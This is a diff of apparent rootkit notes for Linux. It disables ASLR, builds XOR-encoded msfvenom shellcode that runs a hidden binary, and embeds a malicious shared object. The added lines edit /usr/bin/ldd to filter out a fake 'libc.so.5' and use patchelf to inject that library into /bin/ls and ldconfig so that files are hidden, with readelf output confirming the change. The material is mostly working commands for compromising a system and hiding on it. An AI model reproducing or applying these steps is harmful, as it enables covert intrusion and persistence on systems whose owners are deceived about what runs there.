@@ -5,3 +5,27 @@ echo 0 > /proc/sys/kernel/randomize_va_space
 xxd -i hello.so > hello.h
 
 msfvenom -p linux/x64/exec CMD=/path/to/ishd -f c -b "\x00\x0a\x0d" -e x64/xor_dynamic > enc_shellcode.txt
+
+Change this line in /usr/bin/ldd:
+
+try_trace "$RTLD" "$file" || result=1
+
+To:
+
+try_trace "$RTLD" "$file" | grep -v libc.so.5 || result=1
+
+Patch here to hide files:
+
+patchelf --add-needed /lib/x86_64-linux-gnu/libc.so.5 /bin/ls
+
+Patch to hide from ldconfig too:
+
+patchelf --add-needed /lib/x86_64-linux-gnu/libc.so.5 /usr/sbin/ldconfig
+
+Only the library is see now is readelf:
+
+# readelf -d /bin/ls | grep NEEDED
+ 0x0000000000000001 (NEEDED)             Shared library: [/lib/x86_64-linux-gnu/libc.so.5]
+ 0x0000000000000001 (NEEDED)             Shared library: [libselinux.so.1]
+ 0x0000000000000001 (NEEDED)             Shared library: [libcap.so.2]
+ 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
